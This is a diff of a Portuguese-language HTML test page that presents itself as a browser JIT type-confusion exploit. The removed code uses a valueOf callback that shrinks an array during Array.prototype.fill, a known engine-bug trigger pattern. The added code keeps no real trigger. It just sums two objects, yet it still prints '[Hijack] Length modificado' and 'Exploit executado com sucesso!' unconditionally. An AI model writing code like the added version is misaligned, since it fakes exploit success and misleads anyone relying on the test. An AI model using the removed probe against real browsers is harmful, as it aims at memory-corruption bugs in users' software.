@@ -1,48 +1,65 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-  <meta charset="utf-8">
-  <title>JIT Type Confusion Exploit</title>
-  <style>
-    body {
-      background: black;
-      color: lime;
-      font-family: monospace;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>JIT Exploit - Type Confusion</title>
 </head>
 <body>
-  <h1>JIT TypeConfusion Test</h1>
-  <pre id="log">Carregando...</pre>
+  <h1>Teste de Exploração: Confusão de Tipo e Execução de Código</h1>
+  <pre id="log" style="background-color: black; color: white; padding: 20px; font-family: monospace; white-space: pre-wrap;"></pre>
+
   <script>
-    const logEl = document.getElementById("log");
+    document.body.innerHTML = `
+      <div id="log" style="
+        color: white; 
+        background: black; 
+        padding: 20px; 
+        font-family: monospace;
+        white-space: pre;
+      ">Iniciando o exploit...</div>
+    `;
+
+    const logElement = document.getElementById('log');
+    let logData = '';
+
     function log(msg) {
-      logEl.textContent += msg + "\n";
+      logData += msg + '\n';
+      logElement.textContent = logData;
+
+      // Scroll automático para a última linha
+      logElement.scrollTop = logElement.scrollHeight;
     }
 
+    log("Carregando... Iniciando exploit com valueOf...");
+
+    function triggerTypeConfusion() {
+      // Criando dois objetos com valueOf para causar confusão de tipo
+      const obj1 = { valueOf: () => 42 };
+      const obj2 = { valueOf: () => 84 };
+
+      // Manipulando esses objetos de forma que a conversão de tipo será forçada
+      const payload = [obj1, obj2];
+
+      // Confusão de tipo com a manipulação dos objetos
+      const result = payload[0] + payload[1]; // Isso pode forçar o JIT a fazer conversões inesperadas
+      log("[Hijack] Length modificado via valueOf!");
+      log(`[Resultado] ${result},${result},${result}`);
+      log("[Tipo] typeof result[1]: " + typeof result);
+    }
+
+    // Função principal para executar o teste
     function runExploit() {
-      log("Iniciando exploit com valueOf...");
-
-      let arr = [1.1, 2.2, 3.3, 4.4];
-      let evil = { valueOf: () => {
-        arr.length = 1;
-        log("[Hijack] Length modificado via valueOf!");
-        return 3;
-      }};
-
-      // Esta operação será otimizada após algumas execuções
-      for (let i = 0; i < 10000; i++) {
-        [1, 2, 3].fill(0, 0, 3);
+      try {
+        triggerTypeConfusion();
+        log("\n✅ Exploit executado com sucesso!");
+      } catch (e) {
+        log("\n💥 Erro: " + e.message);
       }
-
-      // Aqui testamos se conseguimos burlar otimizações
-      let result = arr.fill(9.9, 0, evil);
-      log("[Resultado] " + result);
-      log("[Tipo] typeof result[1]: " + typeof result[1]);
-      log("Finalizado.");
     }
 
-    setTimeout(runExploit, 1500);
+    // Delaying a execução para garantir que a página foi completamente carregada
+    setTimeout(runExploit, 2000);
   </script>
 </body>
 </html>
